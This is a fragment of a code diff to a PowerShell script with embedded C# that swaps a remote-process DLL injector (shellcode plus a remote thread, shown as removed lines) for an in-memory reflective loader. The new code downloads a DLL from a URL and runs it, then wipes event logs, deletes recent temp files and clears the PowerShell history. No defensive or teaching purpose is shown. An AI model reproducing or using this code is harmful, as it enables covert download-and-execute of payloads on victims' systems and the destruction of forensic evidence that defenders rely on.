+                uint ir  = RU32(img, eo + 16);
+                uint inr = RU32(img, eo + 0);
+                if (nr == 0) break;
 
-        // 8. Create remote thread that calls DllMain
-        IntPtr entryAddr = baseAddr + (int)entryPoint;
+                string dn = RAscii(img, nr);
+                IntPtr hd = GetModuleHandleA(dn);
+                if (hd == IntPtr.Zero) hd = LoadLibraryA(dn);
+                if (hd == IntPtr.Zero) { ie++; continue; }
 
-        // Allocate shellcode in target
-        IntPtr shellcodeBase = IntPtr.Zero;
-        IntPtr shellcodeSize = (IntPtr)0x1000;
-        status = NtAllocateVirtualMemory(hProcess, ref shellcodeBase, IntPtr.Zero, ref shellcodeSize, 0x1000 | 0x2000, 0x40);
-        if (status != 0) { Cleanup(hProcess, baseAddr); return false; }
+                long to = 0;
+                uint tb = inr != 0 ? inr : ir;
+                int ts = is64 ? 8 : 4;
 
-        // Build shellcode:
-        //   mov rcx, baseAddr       ; hinstDLL
-        //   mov edx, 1              ; fdwReason = DLL_PROCESS_ATTACH
-        //   xor r8, r8              ; lpvReserved = NULL
-        //   mov rax, entryAddr
-        //   call rax
-        //   ret
-        byte[] sc = new byte[64];
-        int idx = 0;
-        sc[idx++] = 0x48; sc[idx++] = 0xB9; // mov rcx, imm64
-        byte[] baseBytes = BitConverter.GetBytes((ulong)baseAddr);
-        Array.Copy(baseBytes, 0, sc, idx, 8); idx += 8;
-        sc[idx++] = 0xBA; // mov edx, 1
-        sc[idx++] = 0x01; sc[idx++] = 0x00; sc[idx++] = 0x00; sc[idx++] = 0x00;
-        sc[idx++] = 0x4D; sc[idx++] = 0x31; sc[idx++] = 0xC0; // xor r8, r8
-        sc[idx++] = 0x48; sc[idx++] = 0xB8; // mov rax, imm64
-        byte[] entryBytes = BitConverter.GetBytes((ulong)entryAddr);
-        Array.Copy(entryBytes, 0, sc, idx, 8); idx += 8;
-        sc[idx++] = 0xFF; sc[idx++] = 0xD0; // call rax
-        sc[idx++] = 0xC3; // ret
+                while (true)
+                {
+                    long te = tb + to;
+                    long tv = is64 ? (long)RU64(img, te) : (long)RU32(img, te);
+                    if (tv == 0) break;
 
-        status = NtWriteVirtualMemory(hProcess, shellcodeBase, sc, (IntPtr)idx, out _);
-        if (status != 0) { Cleanup(hProcess, baseAddr); NtFreeVirtualMemory(hProcess, ref shellcodeBase, ref shellcodeSize, 0x8000); return false; }
+                    long of = is64 ? unchecked((long)0x8000000000000000L) : (long)0x80000000;
+                    IntPtr fa = IntPtr.Zero;
 
-        // Create thread
-        IntPtr hThread;
-        status = NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess, shellcodeBase, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
-        if (status != 0) { Cleanup(hProcess, baseAddr); NtFreeVirtualMemory(hProcess, ref shellcodeBase, ref shellcodeSize, 0x8000); return false; }
+                    if ((tv & of) != 0)
+                        fa = GetProcAddress(hd, (IntPtr)(int)(tv & 0xFFFF));
+                    else
+                        fa = GetProcAddress(hd, RAscii(img, tv + 2));
 
-        // Wait briefly for DllMain to execute
-        long timeout = -10000000; // 1 second
-        NtWaitForSingleObject(hThread, false, ref timeout);
-        NtClose(hThread);
-
-        // Free shellcode
-        NtFreeVirtualMemory(hProcess, ref shellcodeBase, ref shellcodeSize, 0x8000);
-
-        // 9. Wipe headers if requested
-        if (wipeHeaders) {
-            byte[] zeros = new byte[Math.Min(0x1000, opt.SizeOfHeaders)];
-            NtWriteVirtualMemory(hProcess, baseAddr, zeros, (IntPtr)zeros.Length, out _);
+                    if (fa != IntPtr.Zero)
+                    {
+                        IntPtr ia = (IntPtr)(ab + ir + to);
+                        if (is64) Marshal.WriteInt64(ia, fa.ToInt64());
+                        else      Marshal.WriteInt32(ia, fa.ToInt32());
+                    }
+                    to += ts;
+                }
+                ie++;
+            }
         }
 
-        return true;
+        res.CrtInitAddr = IntPtr.Zero;
+        if (eraw != 0)
+        {
+            uint eatRva = RU32(img, eraw + 0x1C);
+            uint enpRva = RU32(img, eraw + 0x20);
+            uint eoiRva = RU32(img, eraw + 0x24);
+            uint numN   = RU32(img, eraw + 0x18);
+
+            for (uint i = 0; i < numN; i++)
+            {
+                uint nameRva = RU32(img, enpRva + i * 4);
+                string fn = RAscii(img, nameRva);
+                if (fn == "_CRT_INIT" || fn == "CRT_INIT")
+                {
+                    ushort ord = RU16(img, eoiRva + i * 2);
+                    uint fnRva = RU32(img, eatRva + ord * 4);
+                    if (fnRva != 0)
+                    {
+                        res.CrtInitAddr = (IntPtr)(ab + fnRva);
+                        break;
+                    }
+                }
+            }
+        }
+
+        foreach (var s in secs)
+        {
+            uint sz = Math.Max(s.VS, s.SRD);
+            if (sz == 0) continue;
+            uint op;
+            VirtualProtect((IntPtr)(ab + s.VA), (UIntPtr)sz, SProt(s.Ch), out op);
+        }
+
+        FlushInstructionCache(GetCurrentProcess(), img, (UIntPtr)soi);
+
+        res.DllMainAddr = IntPtr.Zero;
+        if (callEntry && ep != 0)
+        {
+            res.DllMainAddr = (IntPtr)(ab + ep);
+
+            if (res.CrtInitAddr != IntPtr.Zero)
+            {
+                try
+                {
+                    var crtFn = (DllMainFn)Marshal.GetDelegateForFunctionPointer(res.CrtInitAddr, typeof(DllMainFn));
+                    crtFn(img, 1, IntPtr.Zero);
+                }
+                catch { }
+            }
+
+            try
+            {
+                var fn = (DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr, typeof(DllMainFn));
+                bool ok = fn(img, 1, IntPtr.Zero);
+            }
+            catch { }
+        }
+
+        return res;
     }
 
-    // ---------- Helpers ----------
-    static T ByteArrayToStructure<T>(byte[] bytes, int offset) where T : struct {
-        int size = Marshal.SizeOf<T>();
-        IntPtr ptr = Marshal.AllocHGlobal(size);
-        Marshal.Copy(bytes, offset, ptr, size);
-        T obj = Marshal.PtrToStructure<T>(ptr);
-        Marshal.FreeHGlobal(ptr);
-        return obj;
-    }
-
-    static string GetStringFromRVA(byte[] bytes, uint rva) {
-        int offset = (int)rva;
-        int len = 0;
-        while (offset + len < bytes.Length && bytes[offset + len] != 0) len++;
-        return System.Text.Encoding.ASCII.GetString(bytes, offset, len);
-    }
-
-    static void Cleanup(IntPtr hProcess, IntPtr baseAddr) {
-        IntPtr size = IntPtr.Zero;
-        NtFreeVirtualMemory(hProcess, ref baseAddr, ref size, 0x8000); // MEM_RELEASE
+    public static bool Free(IntPtr b)
+    {
+        return VirtualFree(b, UIntPtr.Zero, MEM_RELEASE);
     }
 }
-"@
+'@
 
-# Compile the C# code
-Add-Type -TypeDefinition $csharpCode -Language CSharp
-
-# 6. Inject
-Write-Output "[*] Injecting..."
-$result = [ManualMapper]::Inject($dllBytes, $pid, $true, $true)
-if ($result) {
-    Write-Output "[+] Injection successful."
-} else {
-    Write-Output "[-] Injection failed."
+try {
+    Add-Type -TypeDefinition $loaderCode -ErrorAction Stop
+} catch {
+    Invoke-Finalize
+    return
 }
+
+$bytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)
+[NativeLoader]::Map($bytes, $true)
+
+# =============================================================
+#  WIPE EVENT LOGS — LAST STEP (after map)
+# =============================================================
+
+try { [LogWiper]::Wipe() } catch { }
+
+# =============================================================
+#  CLEANUP
+# =============================================================
+
+Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+$bytes = $null
+$loaderCode = $null
+$logWiperCode = $null
+[GC]::Collect()
+[GC]::WaitForPendingFinalizers()
+
+$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $historyPath) {
+    Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
+}
+
+Invoke-Finalize
